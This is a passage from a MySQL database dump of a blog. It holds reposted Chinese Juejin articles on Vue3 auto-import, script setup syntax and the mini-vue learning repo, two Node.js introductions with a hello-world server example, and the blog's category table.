import(\'vue\')[\'computed\']\n  const createApp: typeof import(\'vue\')[\'createApp\']\n  const customRef: typeof import(\'vue\')[\'customRef\']\n  const defineAsyncComponent: typeof import(\'vue\')[\'defineAsyncComponent\']\n  const defineComponent: typeof import(\'vue\')[\'defineComponent\']\n  const effectScope: typeof import(\'vue\')[\'effectScope\']\n  const EffectScope: typeof import(\'vue\')[\'EffectScope\']\n  const getCurrentInstance: typeof import(\'vue\')[\'getCurrentInstance\']\n  const getCurrentScope: typeof import(\'vue\')[\'getCurrentScope\']\n  const h: typeof import(\'vue\')[\'h\']\n  const inject: typeof import(\'vue\')[\'inject\']\n  const isReadonly: typeof import(\'vue\')[\'isReadonly\']\n  const isRef: t  ypeof import(\'vue\')[\'isRef\']\n  // ...\n}\nexport {}\n\n复制代码</code></pre><h2>使用</h2><pre><code class=\"language-hljs language-javascript copyable\">&lt;script lang=\"ts\" setup name=\"OrderList\"&gt;\n// 不用import，直接使用ref\nconst count = ref(0)\n\nonMounted(() =&gt; {\n  console.log(\'mounted===\')\n})\n&lt;/script&gt;\n复制代码</code></pre><p>上面我们在<code>vite.config.ts</code>的配置里只导入了<code>vue</code>，<code>imports: [\'vue\']</code>，除了<code>vue</code>的你也可以根据文档导入其他的如<code>vue-router</code>、<code>vue-use</code>等。</p><p>个人建议只对一些比较熟悉的API做自动导入，如<code>vue</code>的API我们在开发时都比较熟悉，闭着眼都能写出来，对于一些不大熟悉的像<code>VueUse</code>这种库，还是使用<code>import</code>更好一些，毕竟编辑器都有提示，不易写错。</p><h2>解决<code>eslint</code>报错问题</h2><p>在没有<code>import</code>的情况下使用会导致<code>eslint</code>提示报错，通过如下步骤解决：</p><pre><code class=\"language-hljs language-javascript copyable\">// vite.config.ts\nAutoImport({\n    dts: \'types/auto-imports.d.ts\',\n    imports: [\'vue\'],\n    // 解决eslint报错问题\n    eslintrc: {\n      enabled: true\n    }\n})\n复制代码</code></pre><p>这时会自动生成<code>.eslintrc-auto-import.json</code>文件，将其导入<code>eslintrc.js</code>即可。</p><pre><code class=\"language-hljs language-js copyable\">// eslintrc.js\nmodule.exports = {\n  extends: [\n    \'./.eslintrc-auto-import.json\'\n  ]\n}\n复制代码</code></pre><h1>三、告别.value</h1><p>众所周知，<code>ref</code>要求我们访问变量时需要加上<code>.value</code>，这让很多开发者觉得难受.</p><pre><code class=\"language-hljs language-javascript copyable\">let count = ref(1)\n\nconst addCount = () =&gt; {\n  count.value += 1\n}\n复制代码</code></pre><p>后来尤大大也提交了一份新的<code>ref</code>语法糖提案。</p><pre><code class=\"language-hljs language-javascript copyable\">ref: count = 1\n\nconst addCount = () =&gt; {\n  count += 1\n}\n复制代码</code></pre><p>该提案一出便引起了社区的一片讨论，时间已经过去很久了，这里就不再废话这个话题了。</p><p>这里我介绍的是另外一种写法，也是官方后来出的一种方案，在<code>ref</code>前加上<code>$</code>，该功能默认关闭，需要手动开启。</p><pre><code class=\"language-hljs language-javascript copyable\">// vite.config.ts\nimport { defineConfig } from \'vite\'\nimport vue from \'@vitejs/plugin-vue\'\n\nexport default defineConfig({\n  plugins: [\n    vue({\n      refTransform: true // 开启ref转换\n    })\n  ]\n})\n复制代码</code></pre><p>开启之后可以这样写：</p><pre><code class=\"language-hljs language-javascript copyable\">let count = $ref(1)\n\nconst addCount = () =&gt; {\n  count++\n}\n复制代码</code></pre><p>该语法糖根据不同的版本配置也略有不同，下面贴一下我自己所用相关插件的版本：</p><pre><code class=\"language-hljs language-perl copyable\">\"vue\": \"^3.2.2\",\n\"@vitejs/plugin-vue\": \"^1.9.0\",\n\"@vue/compiler-sfc\": \"^3.2.5\",\n\"vite\": \"^2.6.13\"\n复制代码</code></pre><blockquote>该属性仍处于实验性阶段，谨慎使用！！！<br>作者：小学生study<br>链接：https://juejin.cn/post/7054317318343491615<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</blockquote><p><br></p>', 1663311058254);
INSERT INTO `blog` VALUES (350102741512261, 347616281571397, '上手后才知道 ，Vue3 的 script setup 语法糖是真的爽', '<p><br></p><h3>script setup 是个啥？</h3><p>它是 Vue3 的一个新语法糖，在 <code>setup</code> 函数中。所有 ES 模块导出都被认为是暴露给上下文的值，并包含在 setup() 返回对象中。相对于之前的写法，使用后，语法也变得更简单。</p><p>使用方式极其简单，仅需要在 <code>script</code> 标签加上 <code>setup</code> 关键字即可。示例：</p><pre><code class=\"language-hljs language-js copyable\">&lt;script setup&gt;&lt;/script&gt;\n复制代码</code></pre><h3>组件自动注册</h3><p>在 script setup 中，引入的组件可以直接使用，无需再通过<code>components</code>进行注册，并且无法指定当前组件的名字，它会自动以文件名为主，也就是不用再写<code>name</code>属性了。示例：</p><pre><code class=\"language-hljs language-js copyable\">&lt;template&gt;\n    &lt;Child /&gt;\n&lt;/template&gt;\n\n&lt;script setup&gt;\nimport Child from \'./Child.vue\'\n&lt;/script&gt;\n复制代码</code></pre><p>如果需要定义类似 name 的属性，可以再加个平级的 script 标签，在里面实现即可。</p><h3>组件核心 API 的使用</h3><h4>使用 props</h4><p>通过<code>defineProps</code>指定当前 props 类型，获得上下文的props对象。示例：</p><pre><code class=\"language-hljs language-js copyable\">&lt;script setup&gt;\n  import { defineProps } from \'vue\'\n\n  const props = defineProps({\n    title: String,\n  })\n&lt;/script&gt;\n复制代码</code></pre><h4>使用 emits</h4><p>使用<code>defineEmit</code>定义当前组件含有的事件，并通过返回的上下文去执行 emit。示例：</p><pre><code class=\"language-hljs language-js copyable\">&lt;script setup&gt;\n  import { defineEmits } from \'vue\'\n\n  const emit = defineEmits([\'change\', \'delete\'])\n&lt;/script&gt;\n复制代码</code></pre><h4>获取 slots 和 attrs</h4><p>可以通过<code>useContext</code>从上下文中获取 slots 和 attrs。不过提案在正式通过后，废除了这个语法，被拆分成了<code>useAttrs</code>和<code>useSlots</code>。示例：</p><pre><code class=\"language-hljs language-js copyable\">// 旧\n&lt;script setup&gt;\n  import { useContext } from \'vue\'\n\n  const { slots, attrs } = useContext()\n&lt;/script&gt;\n\n// 新\n&lt;script setup&gt;\n  import { useAttrs, useSlots } from \'vue\'\n\n  const attrs = useAttrs()\n  const slots = useSlots()\n&lt;/script&gt;\n复制代码</code></pre><h3>defineExpose API</h3><p>传统的写法，我们可以在父组件中，通过 ref 实例的方式去访问子组件的内容，但在 script setup 中，该方法就不能用了，setup 相当于是一个闭包，除了内部的 <code>template</code>模板，谁都不能访问内部的数据和方法。</p><p>如果需要对外暴露 setup 中的数据和方法，需要使用 defineExpose API。示例：</p><pre><code class=\"language-hljs language-xml copyable\">&lt;script setup&gt;\n	import { defineExpose } from \'vue\'\n	const a = 1\n	const b = 2\n	defineExpose({\n	    a\n	})\n&lt;/script&gt;\n复制代码</code></pre><h4>属性和方法无需返回，直接使用！</h4><p>这可能是带来的较大便利之一，在以往的写法中，定义数据和方法，都需要在结尾 return 出去，才能在模板中使用。在 script setup 中，定义的属性和方法无需返回，可以直接使用！示例：</p><pre><code class=\"language-hljs language-js copyable\">&lt;template&gt;\n  &lt;div&gt;\n   	&lt;p&gt;My name is {{name}}&lt;/p&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script setup&gt;\nimport { ref } from \'vue\';\n\nconst name = ref(\'Sam\')\n&lt;/script&gt;\n复制代码</code></pre><h3>写在最后</h3><p>写作不易，希望可以获得你的一个「赞」。如果文章对你有用，可以选择「收藏」。<br>如有文章有错误或建议，欢迎评论指正，谢谢你。❤️<br>作者：木亦Sam<br>链接：https://juejin.cn/post/6983626263327932429<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p><br></p>', 1663311102127);
INSERT INTO `blog` VALUES (350103041523781, 347616281571397, '字节一面，面试官问我Vue3源码，我说……', '<p><br></p><p>“哥，我面试字节挂了！”</p><p>小明哭丧着脸：“MD，太卷了！这 Vue3 刚转正没多久，面试官就问上我原理了，什么 <strong>reactivity 实现原理，proxy ，Vue3初始化的流程，编译优化，diff 算法的实现</strong>……直接一面就挂了！”</p><p>“面试问原理正常呀， 虽然 Vue3 刚转正，但已经发版很久了呀，你不会没关注吧？ ”</p><p>小明抓了抓头发：“关注是关注了， 但源码看不懂呀 ，那一个 renderer.ts 文件就 2000 多行代码，这怎么看呀？”。</p><p><img src=\"https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/75fe1d3798df49d3b71725b1a0e9b9a2~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><p>“源码是难，<strong>但如果你想面大厂拿高工资，源码是绕不过的呀</strong>。面试官通过问你源码，一下子就能知道你是不是一个爱学习爱钻研的同学，还有呀，那 Vue3 项目那么大，处理的工程问题也要比我们平时做的项目复杂不知多少倍了，<strong>看看人家解决问题的思路和方式，也是非常受益的</strong>。“</p><p>“哥，源码重要性我知道，关键是看不懂……你那有没有好的 Vue3 源码学习资料呀 ，赶紧给老弟推荐推荐~” &nbsp;</p><p>“你别说，还真让你赶上了，最近 github 上有一个库叫做 <strong>mini-vue</strong> , 用它来学习 Vue3 源码可以把难度降到最低。</p><p>“mini-vue 这个库主要特点是把 <strong>Vue3 源码中最核心的逻辑剥离出来，只留下核心逻辑</strong> <strong>，</strong> 而且带有<strong>详细的中文注释以及完善的输出</strong>，可以帮助你快速理解框架核心运行流程。”</p><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2508438adf464c72867e81f26ed9be28~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><blockquote>注释说明了逻辑处理的 case 是什么,非常清晰 (图片截取自mini-vue)</blockquote><p>“哇塞，还有中文注释呢，真是太贴心了，毕竟我这英文确实不咋地哈哈！”</p><p>“你再跑一下库的 example 看看， 就那个 helloworld ，然后看看控制台的输出。“</p><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e2a1e30ea2744a73bf77e3720504d82e~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><p>\"这些输出是什么？等等， 难道说是程序执行的流程节点？\"</p><p>“没错，就是程序执行的流程， <strong>基于这个输出日志，你就能知道实例化一个组件的流程是什么</strong>了， 有助于你理解整个框架的执行流程， 先建立一个整体认知。”</p><p>“而且你看看输出的右侧，你可以<strong>直接点击跳转到对应的代码上</strong>，然后就可以开开心心打上断点，好好琢磨这代码的实现了。”</p><p><img src=\"https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6964953a5473459d84c3c889bacc4bba~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><p>“真是绝了， 怪不得这个库现在已经拿到 4.4k 的 star 了”</p><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e7bc541485e34ee087f701a31ebd654a~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><p>“还不只如此呢，再给你看个绝活，mini-vue 库里面的代码实现是和 Vue3 源码里面的实现<strong>保持高度一致</strong>的，比如说函数的命名吧，你看这个 diff 算法函数是 patchKeyedChildren 吧”</p><p><img src=\"https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/63e40c8346c149bbb15a0904a72aa57a~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><p>当你看完简单版的实现后，想看看源码里面是如何实现的， 你只需要复制这个函数名，然后跑到 Vue3 里面搜索一下就可以了。</p><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f1cc85e7cafe4d8f98a342a6a2a832f8~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><p>“我草，这个绝了，我<strong>看完简单版本之后，再去看源码的话，难度就降低很多了呀！</strong> ”</p><p>“哈哈哈，是的，这个其实也符合学习模型，如果你一上来就看特别复杂的，对你来讲就到了学习的恐慌区了，<strong>很多同学就是被吓的，一看代码量那么大，逻辑那么复杂，直接就放弃了。而学习 mini-vue 这个库就是简单模式，</strong> 我再跟你说说 mini-vue 是基于什么思想做出来的吧 &nbsp;你以后也可以按照它的方式来实现你自己的 mini-react、mini-webpack、mini-rollup 。”</p><p>“真的是迫不及待了，哥你赶快坐下，我这就给你买罐红牛去，好好给我上一课~哈哈”</p><p>我喝了一口刚刚从冰箱拿出来的冰镇红牛，翘着二郎腿缓缓说道：“看你今天这么好学的份上，我再给你唠叨几句。像 Vue3 这么大的工程项目，它会做很多事，比如给开发环境下的用户良好的错误提示↓”</p><p><img src=\"https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2f2215f4413046ad918f7b22f6569702~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><p>“你看这个，这里是在处理 HMR （热更新）↓”</p><p><img src=\"https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4669cbe9d7d04ad2bed5831a42d60b0a~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><p>“而这些逻辑在你刚刚看源码的时候是不需要关心的，但是这部分的逻辑对于你这个新手来讲<strong>非常不好区分</strong>，我给你画个图你感受感受”</p><p>“哈哈哈，哥你可真是灵魂画手呀，这尼玛画的这么抽象，不过我看明白了。你是指<strong>红色的方块是核心逻辑，而紫色的圆圈都是非核心的吧，比如错误提示和HMR</strong>”</p><p>“哈哈哈，看来我的画功还是不错的，你一下就明白了，就是这个道理。而我们学习源码的时候第一步就是先摸清这个核心逻辑，这个也称之为 <strong>happy path</strong>， 相当于一棵大树的树干。把这个拿下后，后面我们就可以自己看了，代码逻辑里面无非就是处理各种各样的 edge case（边缘情况）。你有没有发现，其实<strong>这是对 Vue3 框架做了功能上的拆分</strong>。”</p><p>“我擦，又学到了，我已经感受到了，<strong>把 Vue3 整体拆分变小，然后这样难度就直线下降了</strong>，而我们再把 <strong>happy path</strong> 理解透彻，这一步学完之后再去理解那些 HMR 或者错误提示的逻辑，也会变得更简单。”</p><p>“对的，这个就是<strong>任务拆分</strong>的思想，你可以横着切，也可以纵着切，想怎么切就怎么切，如果从算法思想的角度来讲的话就是……”</p><p>“就是<strong>分而治之</strong>的思想！” 小明赶紧把他知道的名词抢先回答出来，生怕别人不知道他学过算法。</p><p><img src=\"https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2cbdff6a7c684fec879cfab686e6138a~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><p>“哎呀，可以呀小明，看来你算法学得不错嘛。所以这个 mini-vue 库对于想学习源码的同学来讲非常有意义，现在作者已经完成了三大模块的编写了。”</p><p>“噢？三大模块是啥？我这还真不知道”</p><p>“三大模块是指 <strong>reactivity（响应式模块）、runtime-core（运行时模块）、compiler（编译模块）</strong> ， Vue3 的核心就是这三大模块。现在 Vue3 的源码是采用 monorepo 的形式， 分了好多模块，不过对于你这初学者来讲，<strong>研究透三大模块就够你面试用了</strong>”</p><p>\"哦了哦了，我这就去把 mini-vue clone 下来好好学习学习，回头面试的时候争取搞定面试官！哥，那我学习 mini-vue 遇见问题的话可还得麻烦你呀，哈哈哈~\"</p><p>“你可以直接加 mini-vue 作者的微信: <strong>cuixr1314</strong>，我们都叫他<strong>大崔哥</strong>。有问题直接问他就好了嘛 ，我有问题也是直接问他， 关于 mini-vue 上的问题他会回答你的，放心好了”</p><p>\"我这就赶紧加上大崔哥哈哈哈~开心\"<br>作者：阿崔cxr<br>链接：https://juejin.cn/post/7070809037398343717<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>', 1663311175372);
INSERT INTO `blog` VALUES (350103707091013, 347616292274245, '为什么是Node.js?', '<p><br></p><h1>为什么是Node.js?</h1><p>我们都知道 Node.js 在诞生之初是为了实现高性能的 web 服务器，再后来 Node.js 慢慢演化为了一门服务端“语言”。</p><h2>为什么在众多的解决方案中 Node.js 是最出彩的哪一个？</h2><p>下面，来看一下 用户从发送请求 到获取数据的整个过程<br><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3b475a695e3c44f9badda55bce5c5bb0~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><ol><li>客户端依据用户的操作发起请求</li><li>服务端根据业务逻辑响应对应的请求</li></ol><p>在这里我们抛开带宽、硬件、性能等客观因素，真正影响用户获取数据速度的是：<strong>IO的时间消耗</strong>。<br>而我们都知道 IO 是计算机操作过程中最缓慢的环节（在磁盘和网络中的消耗是毫秒级别的）。</p><h2>假设</h2><p>当前目前是一个串行的任务，正在处理的一个请求中有一个需要长时间进行处理的 IO 行为，那么后续的任务就不能得到及时的响应。</p><p>当前很多的高级编辑语言都是采取多进程、多线程的方式来进行处理，但是也是会有一些问题的。</p><h3>这里我们用餐馆来进行举例：</h3><ul><li>当前有几个客人来点菜（几个请求发出）</li><li>就有几个服务员来进行服务（几个线程来进行响应这个请求）<br>这样对客人的体验是非常好，但是如果某个时间段有很多的客人进来，我们的线程并不能无限制的增加，这样无人响应的过程就出现了。</li></ul><h3>Reactor 模式</h3><p>基于这种情况，就有了 Reactor 模式，也就是应答者模式。</p><p>他的核心思想就是，仅仅保留一个服务员，然后让客人自己进行点餐，等客人点餐完毕之后，呼叫服务员就行。</p><p>这样的话，就是用单线程完成了多线程的事情，并且他是非阻塞的，使用这样的操作，可以避免多个线程进行切换的时候，状态的保存、时间的消耗等问题</p><p><strong>Node.js 正是基于 Reactor 模式 和 js语言本身的特性，让单线程远离阻塞从而通过异步非阻塞IO跟好的使用 sql 支援。</strong></p><h2>Node.js 可以做什么？</h2><ul><li>轻量级、高性能的 Web 服务</li><li>前后端 JavaScript 同构开发</li><li>便捷高效的前端工程化</li></ul><h2>Node.js 架构</h2><p>这里我们将 Node.js 的核心分成了三个大的部分</p><ul><li>Natives modules： 暴露出来对应的接口，提供开发者使用</li><li>Builtin modules： 帮助 node.js 找到对应的 c++ 调用接口</li><li>具体功能层：负责js代码的最终执行，处理node环境下的代码执行细节</li></ul><h3>Natives modules</h3><ul><li>当前层内容由 JS 实现</li><li>提供应用程序可直接调用库，例如 fs、path、http 等</li><li>JS 语言无法直接操作底层硬件设备<br>正因为<strong>JS 语言无法直接操作底层硬件设备</strong>，所以我们需要对应的中间层来为我们进行转发事件<strong>Builtin modules</strong>应运而生。</li></ul><h3>Builtin modules 胶水层</h3><p>通过这个中间层，我们可以让 Node.js 的核心模块来获得更底层的操作，例如文件的读写行为。</p><h3>具体功能层</h3><p>这一层是一些具体的功能模块：</p><ul><li>v8：执行 js 代码，提供桥梁接口</li><li>libuv： 事件循环、事件队列、异步IO</li><li>c-ares(DNS)</li><li>http parser</li><li>zlib (compression)</li><li>等...<br><img src=\"https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/268eb2b4686d40e6a05f4febaed0f6d7~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?\" alt=\"image.png\" data-href=\"\" style=\"\"/><br>作者：是洋柿子啊<br>链接：https://juejin.cn/post/7102036641711128589<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</li></ul>', 1663311337864);
INSERT INTO `blog` VALUES (350103891136581, 347616292274245, 'Node.js入门系列（一）', '<p><br></p><h2>写在前面 </h2><p>首先要感谢很多私信和评论的小伙伴的信任和鼓励，让我有动力继续写下去。</p><p>大前端很大，大到我们常常看不到尽头，零零散散的学习总是让我们无法触类旁通，相互鼓励和\"揭短\"才能让自己变得更强大，所以我在文末为独行的小伙伴准备了前端大家庭，有她，前端进阶不孤独。我们仰慕技术大佬，而他们也曾像现在的我们，努力学习，苦苦探索。我也曾受益于很多前辈的提点，所以，我深知鼓励和分享对前行者有多大的帮助。一日一钱，千日千钱，绳锯木断，水滴石穿，点滴积累，终将让我们更强。如果有一天你成为了更强大的自己，如果可以，也不要忘记帮帮那些正努力进阶的前行者，无关乎利益，只因我们都有一个共同的目标。</p><p>Node.js入门系列将是一整套参考教程，从本节开始，我们正式进入Node.js。系列将以结构脑图、文字解释、概括总结、练习实例、面试考点的形式讲述知识点。虽然学习这个系列不能让你立刻涨薪10K，但学到的知识可以让你心里踏实，更有自信。在此，斗胆向你要个关注和点赞，谨以此，致敬不甘平庸的我们。</p><h2>上集回顾 </h2><p>上集是系列的漫谈篇，主要谈了Node.js是什么，以及我们为什么要学习Node.js。</p><p>如果想再次阅览，请点击这里挑选需要阅读的章节：<br><a href=\"https://juejin.cn/post/6862262233494192141\" target=\"_blank\">漫谈Node.js入门</a></p><h2>本节学习目标 </h2><p>正式入门Node.js能解决什么前端痛点问题、Node.js特点及适用场景。</p><h2>本节学习目录 </h2><h4>一 Node.js能解决什么问题？</h4><h4>二 什么项目适合选用Node.js？</h4><h4>三 Node.js安装</h4><h4>四 Node.js应用实例</h4><h4>五 本节小结</h4><h4>六 文末</h4><h2>一、Node.js 能解决什么问题？ </h2><h5>❶ 实现高并发用户连接</h5><p>既然Node.js解决了高并发用户连接的问题，那么反过来想：传统的非Node.js的高并发存在什么问题？Node.js又是通过什么方法解决掉这个问题的呢？</p><h5>传统的非Node.js的高并发存在什么问题？</h5><p>在Java、PHP或ASP.NET等服务器语言中，每一个客户端连接都会为其创建一个新的线程，而每个线程耗费大约需要2MB的内存，如果如果我们的服务器是8GB内存，那么理论上最多同时为4000个左右的用户提供服务。如果要想同时为更多的用户提供服务支持，就要增加服务器的数量，这样一来，硬件成本增加了，并且呢，不同服务器之间的数据共享问题也随之而来。所以，为每一个用户连接创建一个新的线程的方案，受服务器内存限制，成为了高并发连接的瓶颈。</p><h5>Node.js是通过什么改进解决掉这个问题的呢？</h5><p>Node.js为了解决高并发连接问题，放弃了“为每一个用户连接创建一个新线程”的思想，改成为每一个用户连接在Node.js内部，触发一个事件。这就解决了多个用户连接耗尽服务器内存的问题。至于触发了一个什么事件、如何触发的，我们留到后面在讨论。</p><h5>❷ 实现高性能服务器</h5><p>严格的说，Node.js是一个用于开发各种Web服务器的开发工具。在Node.js服务器中，运行的是V8 JavaScript脚本语言。该语言能够被V8 JavaScript引擎解析执行，没错，就是你通过的Chrome 上的V8引擎，Node.js将它用到了服务器上，并且呢，还为它添加了很多新的API，以增强该引擎的能力。光这些还不足以说明Node.js实现的性能有多高，V8引擎内部使用了一种全新的语言编译技术，这种技术可以使得使用JavaScript编写的脚本与通过其他语言（如：C语言）编写的代码具有非常相似的执行效率。（为什么说这个重要呢，后面会讲到，Node.js内部提供了很多的模块，大部分模块是JavaScript编写的，而其他的一些模块是通过其他底层语言编写的，如C语言，V8引擎这种编译技术打破了语言不同造成的执行效率差异问题，使得我们可以忽略掉模块语言差异带来的问题。）</p><h5>❸ 非阻塞I/O及事件循环机制</h5><p>前面说到，Node.js将V8引擎用到了服务器端，实现了高性能的服务器。</p><p>JavaScript是单线程的语言，V8 JavaScript也是如此。不同于浏览器端JavaScript的是，V8 JavaScript提供了非阻塞I/O机制。什么意思呢？其实就是异步的JavaScript网络请求。在等待请求结果的时候，会继续执行请求后面的代码，不用等待数据返回，将请求返回的结果放在回调函数中处理。这种机制就称为非阻塞I/O机制。由于耗时任务不会阻塞后续代码，因此，大大提供了执行效率。当然，此处是以网络请求为例，但实际上事件可以是：文件的增删查改、</p><p>Node.js还有一个事件循环机制</p><p>Node.js中的事件循环机制与JavaScript中的事件循环机制很像，但是又有差异，多出了setImmediate 和 process.nextTick这两种异步方式，这些我们后面细讲，这里只要知道：Node.js具有事件循环机制的特点，并且呢，Node.js能实现高并发也是因为其独特的事件循环机制，这种机制与JavaScript中的事件循环机制有相同也有不同，就可以了，暂不深入去考虑。</p><h2>二、什么项目适合选用Node.js？ </h2><p>根据我们章节中讲过的Node.js的特点，它适用的项目其实就是它的优点，总结如下：</p><p>程序需要处理大量并发的输入输出时，并且再向服务端发送请求后，等待返回结果的这段时间内，不需要处理非常复杂的逻辑。</p><p>项目示例：<br>1）聊天服务器；同一时刻可能存在大量并发连接，而服务器端本身不存在非常复杂的处理。<br>2）电商类服务器：秒杀、抢购、准点开卖等场景。</p><h2>三、Node.js安装 </h2><p><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fen%2Fdownload%2F\" target=\"_blank\">Node.js安装包官网下载地址：</a></p><p>下载安装包，选择安装位置后一直“下一步”就可以了。</p><h2>四、Node.js应用实例 </h2><p>安装好以后，开始我们第一个项目，输出“Hello World”</p><p>步骤一：打开代码编辑器，新建一个文件，保存为hello.js<br>步骤二：在页面中，使用require引入模块（require的引入方式是common.js的引入方式），代码为：</p><pre><code class=\"language-hljs language-ini copyable\">var http = require(\"http\");\n\n复制代码</code></pre><p>步骤三：我们使用http.createServer() 方法创建服务器，并使用 listen 方法绑定 8888 端口。 函数通过 request, response 参数来接收和响应数据。整个页面的代码写法如下：</p><pre><code class=\"language-hljs language-javascript copyable\">var http = require(\'http\');\n\nhttp.createServer(function (request, response) {\n\n    // 发送 HTTP 头部\n    // HTTP 状态值: 200 : OK\n    // 内容类型: text/plain\n    response.writeHead(200, {\'Content-Type\': \'text/plain\'});\n\n    // 发送响应数据 \"Hello World\"\n    response.end(\'Hello World\\n\');\n}).listen(8888);\n\n// 终端打印如下信息\nconsole.log(\'Server running at http://127.0.0.1:8888/\');\n\n复制代码</code></pre><p>步骤四：通过上面的代码，我们就完成了一个可以工作的HTTP服务器。现在，到了执行的时候了，打开一个终端，路径定位到hello.js目录下（如果是在vscode中，可以按Ctrl + ` 调出终端），接下来在终端中输入命令：</p><pre><code class=\"language-hljs copyable\">node hello.js复制代码</code></pre><p>步骤五：接下来，打开浏览器访问 http://127.0.0.1:8888/，你会看到一个写着 \"Hello World\"的网页。</p><h2>五、本节小结 </h2><p>本节主要是了解Node.js能解决什么问题，有什么特点，适用哪些项目。</p><p>总结如下：</p><ol><li>Node.js编写前需要先安装一个Node.js软件，然后才能正常使用；</li><li>Node.js编写的文件也是以.js结尾的js文件，跟浏览器端编写的js文件一样；</li><li>Node.js文件运行需要使用到终端命令执行，然后才能在浏览器中呈现，而浏览器端js只需要用浏览器打开就可以；</li><li>Node.js编写代码时，常常需要引入模块，还会使用到模块提供的很多方法和属性，而浏览器端js使用的是ECMA提供的API和BOM对象提供的API，基本不需要引入模块，而且引入方式也不同，Node.js遵循common.js标准，使用require引入一个模块，而浏览器端js遵循ES modules标准，通过import引入文件或模块；模块的知识会放到下一节细讲，本节主要是先体验，有初印象。</li><li>Node.js通过终端运行，不存在兼容性问题，而浏览器端JavaScript由于依赖于浏览器环境，因此浏览器不同可能会出现兼容性问题。</li></ol><p>本小节就是这些，下一节会继续更新，欢迎继续关注~<br>作者：前端格局<br>链接：https://juejin.cn/post/6863351989016166407<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p><br></p><p><br></p>', 1663311382797);

-- ----------------------------
-- Table structure for category
-- ----------------------------
DROP TABLE IF EXISTS `category`;
CREATE TABLE `category`  (
  `id` bigint(20) NOT NULL,
  `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of category
-- ----------------------------
INSERT INTO `category` VALUES (347616261972037, 'H5C3');
INSERT INTO `category` VALUES (347616272224325, 'JS');
INSERT INTO `category` VALUES (347616281571397, 'Vue');
INSERT INTO `category` VALUES (347616292274245, 'Node');

SET FOREIGN_KEY_CHECKS = 1;
